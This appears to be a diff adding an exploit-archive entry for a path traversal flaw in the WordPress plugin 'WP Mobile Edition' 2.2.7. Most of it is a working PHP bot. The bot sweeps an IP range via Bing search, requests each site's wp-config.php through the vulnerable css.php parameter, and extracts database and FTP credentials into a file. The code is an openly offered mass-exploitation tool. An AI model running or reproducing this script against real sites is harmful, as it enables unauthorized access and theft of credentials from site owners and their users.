@@ -1,0 +1,110 @@
+######################################################################################
+# Exploit Title: Wordpress Plugin 'WP Mobile Edition' LFI Vulnerability              #
+# Date: june 6, 2015                                                                 #
+# Exploit Author: ViRuS OS                                                           #
+# Google Dork: inurl:?fdx_switcher=mobile                                            #
+# Vendor Homepage: https://wordpress.org/plugins/wp-mobile-edition/                  #
+# Software Link: https://downloads.wordpress.org/plugin/wp-mobile-edition.2.2.7.zip  #
+# Version:  WP Mobile Edition Version 2.2.7                                          #
+# Tested on : windows                                                                #           
+###################################################################################### 
+Description :
+Wordpress Plugin 'WP Mobile Edition' is not filtering data so we can get the configration file in the path 
+< site.com/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php>
+
+# Exploite Code :
+<?php 
+//ViRuS OS
+set_time_limit(0);
+error_reporting(0);
+echo "############### Fdx_Switcher MiniBot By ip Range ##################\n\n";
+print " Coded By        _                            
+          __   _(_)_ __ _   _ ___    ___  ___ 
+          \ \ / / | '__| | | / __|  / _ \/ __|
+           \ V /| | |  | |_| \__ \ | (_) \__ \
+            \_/ |_|_|   \__,_|___/  \___/|___/                                    
+Greets >> CoderLeeT | Fallag Gassrini | Taz| S4hk | Sir Matrix | Kuroi'SH 
+";
+echo "Follow Me On FaceBook : https://www.facebook.com/VirusXOS\n\n";
+echo "Follow Me On FaceBook : https://www.facebook.com/Weka.Mashkel007\n\n";
+echo "#################### Welcome Master ViRuS OS ################\n\n";
+echo "Server Target IP : ";
+$ip=trim(fgets(STDIN,1024));
+$ip = explode('.',$ip);
+$ip = $ip[0].'.'.$ip[1].'.'.$ip[2].'.';
+for($i=0;$i <= 255;$i++)
+{
+$sites = array_map("site", bing("ip:$ip.$i wordpress"));
+$un=array_unique($sites);
+echo "[+] Scanning -> ", $ip.$i, ""."\n";
+echo "Found : ".count($sites)." sites\n\n";
+foreach($un as $pok){
+$host=findit($file,"DB_HOST', '","');");
+$db=findit($file,"DB_NAME', '","');");
+$us=findit($file,"DB_USER', '","');");
+$pw=findit($file,"DB_PASSWORD', '","');");
+$bda="http://$pok";
+	$linkof='/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php';
+	$dn=($bda).($linkof);
+	$file=@file_get_contents($dn);
+	if(eregi('DB_HOST',$file) and !eregi('FTP_USER',$file) ){
+	echo "[+] Scanning => ".$bda."\n\n";
+	echo "[+] DB NAME : ".findit($file,"DB_NAME', '","');")."\n\n";
+	echo "[+] DB USER : ".findit($file,"DB_USER', '","');")."\n\n";
+	echo "[+] DB PASS : ".findit($file,"DB_PASSWORD', '","');")."\n\n";
+	echo "[+] DB host : ".findit($file,"DB_HOST', '","');")."\n\n";
+	$db="[+] DB NAME : ".findit($file,"DB_NAME', '","');")."\n\n";
+	$user="[+] DB USER : ".findit($file,"DB_USER', '","');")."\n\n";
+	$pass="[+] DB PASS : ".findit($file,"DB_PASSWORD', '","');")."\n\n";
+	$host="[+] DB host : ".findit($file,"DB_HOST', '","');")."\n\n";
+	$ux = "".$bda."\r\n";
+	$ux1 = "".$db."\r\n";
+	$ux2 = "".$user."\r\n";
+	$ux3 = "".$pass."\r\n";
+	$ux4 = "".$host."\r\n";
+	$save=fopen('exploited.txt','ab');
+	fwrite($save,"$ux");
+	fwrite($save,"$ux1");
+	fwrite($save,"$ux2");
+	fwrite($save,"$ux3");
+	fwrite($save,"$ux4");
+	}
+	elseif(eregi('DB_HOST',$file) and eregi('FTP_USER',$file)){
+	echo "FTP user : ".findit($file,"FTP_USER','","');")."\n\n";
+	echo "FTP pass : ".findit($file,"FTP_PASS','","');")."\n\n";
+	echo "FTP host : ".findit($file,"FTP_HOST','","');")."\n\n";
+	}
+	else{echo $bda." : Exploit failed \n\n";}
+}
+}
+function findit($mytext,$starttag,$endtag) {
+ $posLeft  = stripos($mytext,$starttag)+strlen($starttag);
+ $posRight = stripos($mytext,$endtag,$posLeft+1);
+ return  substr($mytext,$posLeft,$posRight-$posLeft);
+}
+function site($link){
+return str_replace("","",parse_url($link, PHP_URL_HOST));
+}
+function bing($what){
+for($i = 1; $i <= 2000; $i += 10){
+$ch = curl_init();
+curl_setopt ($ch, CURLOPT_URL, "http://www.bing.com/search?q=".urlencode($what)."&first=".$i."&FORM=PERE");
+curl_setopt ($ch, CURLOPT_USERAGENT, "msnbot/1.0 (http://search.msn.com/msnbot.htm)");
+curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt ($ch, CURLOPT_COOKIEFILE,getcwd().'/cookie.txt');
+curl_setopt ($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
+$data = curl_exec($ch);
+preg_match_all('#;a=(.*?)" h="#',$data, $links);
+foreach($links[1] as $link){
+$allLinks[] = $link;
+}
+if(!preg_match('#"sw_next"#',$data)) break;
+}
+
+if(!empty($allLinks) && is_array($allLinks)){
+return array_unique(array_map("urldecode", $allLinks));
+}
+}
+?>                                                                                  
